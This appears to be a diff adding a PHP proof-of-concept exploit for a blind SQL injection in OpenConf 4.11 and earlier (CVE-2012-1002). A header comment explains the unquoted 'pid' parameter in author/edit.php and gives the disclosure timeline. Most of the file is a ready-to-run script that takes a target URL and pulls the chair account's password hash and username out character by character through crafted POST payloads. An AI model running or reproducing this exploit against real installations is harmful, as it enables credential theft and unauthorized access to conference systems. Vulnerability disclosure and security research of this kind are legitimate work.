@@ -1,0 +1,129 @@
+<?php
+
+/*
+  ---------------------------------------------------------------------
+  OpenConf <= 4.11 (author/edit.php) Remote Blind SQL Injection Exploit
+  ---------------------------------------------------------------------
+  
+  author...............: Egidio Romano aka EgiX
+  mail.................: n0b0d13s[at]gmail[dot]com
+  software link........: http://www.openconf.com/
+  affected versions....: from 4.00 to 4.11
+  
+  +-------------------------------------------------------------------------+
+  | This proof of concept code was written for educational purpose only.    |
+  | Use it at your own risk. Author will be not responsible for any damage. |
+  +-------------------------------------------------------------------------+
+  
+  [-] Vulnerable code in /author/edit.php:
+  
+  104.		// get sub
+  105.		$anr = ocsql_query("SELECT * FROM `" . OCC_TABLE_PAPER . "` WHERE `paperid`=" . safeSQLstr($_POST['pid'])) ...
+  106.		if (mysql_num_rows($anr) != 1) {
+  107.			err(oc_('Submission ID or password entered is incorrect'));
+  108.		}
+  109.		$_POST = array_merge($_POST, mysql_fetch_assoc($anr));
+  
+  User input passed through $_POST['pid'] seems correctly sanitised by the safeSQLstr() function, but in the query
+  at line 105,  single quotes aren't  used before  concatenate the user input  into the query string.  This can be
+  exploited to conduct a  Blind SQL Injection  attack.  Successful exploitation of  this vulnerability requires at
+  least a record into the 'paper' table, and 'Edit Submission' to be enabled.
+
+  [-] Disclosure timeline:
+  
+  [27/01/2012] - Vulnerability discovered
+  [01/02/2012] - Issue reported to bugs(at)openconf.com
+  [02/02/2012] - Version 4.12 released: http://www.openconf.com/news/#20120202
+  [02/02/2012] - CVE number requested
+  [02/02/2012] - Assigned CVE-2012-1002
+  [02/05/2012] - Public disclosure
+  
+*/
+
+if (!extension_loaded('curl')) die("cURL extension required\n");
+
+error_reporting(E_ERROR);
+set_time_limit(0);
+
+function http_get($page)
+{
+  global $ch, $argv;
+	
+  curl_setopt($ch, CURLOPT_URL, $argv[1].$page);
+  curl_setopt($ch, CURLOPT_GET, true);
+
+  return curl_exec($ch);
+}
+
+function http_post($page, $data)
+{	
+  global $ch, $argv;
+	
+  curl_setopt($ch, CURLOPT_URL, $argv[1].$page);
+  curl_setopt($ch, CURLOPT_POST, true);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+
+  return curl_exec($ch);
+}
+
+function hex_enc($sql)
+{
+  for ($i = 0, $n = strlen($sql); $i < $n; $i++)
+    $encoded .= dechex(ord($sql[$i]));
+  return "0x{$encoded}";
+}
+
+print "\n+-------------------------------------------------------------+";
+print "\n| OpenConf <= 4.11 Remote Blind SQL Injection Exploit by EgiX |";
+print "\n+-------------------------------------------------------------+\n";
+
+if ($argc < 2)
+{
+  print "\nUsage......: php $argv[0] <url>\n";
+  print "\nExample....: php $argv[0] http://127.0.0.1/";
+  print "\nExample....: php $argv[0] http://localhost/openconf/\n";
+  die();
+}
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_HEADER, 1);
+curl_setopt($ch, CURLOPT_VERBOSE, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+if (!preg_match('/href="author\/edit.php"/', http_get('openconf.php'))) die("\n[-] Failed: submission edit disabled\n");
+
+$index = 1;
+$hash  = '';
+$chars = array_merge(range(48, 57), range(97, 102), array(0)); // 0-9 a-f
+
+print "\n[-] Chair password hash...: ";
+
+while (!strpos($hash,chr(0)))
+{
+  for ($i = 0, $n = count($chars); $i <= $n; $i++)
+  {
+    if ($i == $n) die("\n[-] Exploit failed!\n");
+    $sql = urlencode("-1 OR 1=(SELECT IF(ASCII(SUBSTR(value,{$index},1))={$chars[$i]},0,1) FROM config WHERE setting=".hex_enc("OC_chair_pwd").") LIMIT 1#");
+    if (preg_match("/is incorrect/", http_post("author/edit.php", "ocaction=1&pid={$sql}"))) { $hash .= chr($chars[$i]); print chr($chars[$i]); break; } 
+  }
+  $index++;
+}
+
+$index = 1;
+$user  = '';
+$chars = array_merge(array(0), range(97, 172), array(95), range(48, 57)); // Any "word" character
+
+print "\n[-] Chair username........: ";
+
+while (!strpos($user,chr(0)))
+{
+  for ($i = 0, $n = count($chars); $i <= $n; $i++)
+  {
+    if ($i == $n) die("\n[-] Exploit failed!\n");
+    $sql = rawurlencode("-1 OR 1=(SELECT IF(ASCII(SUBSTR(value,{$index},1))={$chars[$i]},0,1) FROM config WHERE setting=".hex_enc("OC_chair_uname").") LIMIT 1#");
+    if (preg_match("/is incorrect/", http_post("author/edit.php", "ocaction=1&pid={$sql}"))) { $user .= chr($chars[$i]); print chr($chars[$i]); break; } 
+  }
+  $index++;
+}
+print "\n";
+?>
